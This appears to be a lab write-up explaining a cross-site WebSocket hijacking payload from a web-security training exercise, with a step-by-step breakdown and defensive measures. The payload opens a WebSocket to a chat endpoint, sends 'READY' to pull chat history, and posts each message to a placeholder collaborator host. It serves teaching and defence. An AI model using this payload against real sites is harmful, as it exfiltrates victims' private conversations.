### **Explanation of the Payload:**

```javascript
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send('READY');
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-ID', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

### **Breaking it Down Step by Step:**

1. **Create a WebSocket Connection:**
    
    ```javascript
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ```
    
    - The `new WebSocket()` function creates a WebSocket connection to the chat server.
    - The `wss://` specifies a secure WebSocket connection (similar to `https://` but for WebSockets).

---

2. **Open the Connection and Send the Trigger Message:**
    
    ```javascript
    ws.onopen = function() {
        ws.send('READY');
    };
    ```
    
    - When the WebSocket connection is successfully established (`onopen` event triggered):
        - The script sends the message `'READY'`.
    - **Purpose:** The `READY` message is required to trigger the server into sending the chat history back to the client.

---

3. **Capture Incoming Messages:**
    
    ```javascript
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-ID', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
    ```
    
    - When a message (`event`) is received from the server:
        
        - The data received from the server (`event.data`) is captured and immediately sent to the attacker's external server using the `fetch()` API.
    - **Fetch Request Explanation:**
        
        - `method: 'POST'`: Sends the data as a POST request.
        - `mode: 'no-cors'`: Disables CORS restrictions so the request can be sent across origins without a preflight check.
        - `body: event.data`: The captured chat history or any other data received from the WebSocket server is sent as the body of the POST request.

---

### **What's Happening in the Attack:**

1. **Victim Loads the Malicious Page:**
    - The victim visits a malicious webpage (like an attacker-controlled site).
2. **WebSocket Connection Established:**
    - The script connects to the vulnerable WebSocket endpoint of the chat application.
3. **Triggering the Leak:**
    - The `READY` message is sent, triggering the server to send chat history data.
4. **Data Exfiltration:**
    - The captured data (chat history) is sent to an attacker's server (`YOUR-COLLABORATOR-ID`) for further inspection.

---

### **Why This Works:**

- **No CSRF Protection:** The WebSocket request is not validating the origin or using tokens to verify the request source.
- **SameSite=None Cookies:** Allows cross-origin requests and thus enables the attack.
- **Lack of WebSocket Origin Checking:** The server doesn't verify if the WebSocket request originated from a trusted site.

---

### **Defensive Measures (How to Prevent This):**

- **CSRF Protection:** Implement CSRF tokens in the WebSocket handshake.
- **Origin Check:** Ensure the server checks the `Origin` header during the WebSocket handshake.
- **SameSite Cookie Settings:** Avoid using `SameSite=None` unless necessary.
